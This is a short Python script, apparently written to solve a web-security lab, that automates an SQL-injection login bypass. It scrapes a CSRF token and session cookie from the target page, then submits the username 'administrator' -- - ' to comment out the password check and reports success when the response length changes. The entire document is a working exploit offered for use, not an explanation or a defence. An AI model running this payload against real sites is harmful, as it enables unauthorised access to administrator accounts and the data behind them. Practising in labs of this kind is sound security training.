import requests
import sys

#checking correct arguments
if (len(sys.argv) != 2):
    print(f"[+] USAGE {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

#getting CSRF token and session cookie
response = requests.get(URL)
csrf = response.text[2499:2531]
sess_cookie = response.cookies['session']
mydata = {"csrf":csrf, "username":"administrator", "password":"dummy"}

#getting normal response
response = requests.post(URL, data=mydata, headers={"Cookie":"session="+sess_cookie})
org_length = len(response.text)
print(f"Original response length : {len(response.text)}")

#injecting malicious SQL chars
mydata = {"csrf":csrf, "username":"administrator' -- - ", "password":"dummy"}
response = requests.post(URL, data=mydata, headers={"Cookie":"session="+sess_cookie})
aft_length = len(response.text)
print(f"After SQLi, response length : {len(response.text)}")
print(response.text)

#comparing response lengths to see if we are successfull
if org_length != aft_length:
    print("Injection successfull!!!")
else:
    print("Try harder!!!")
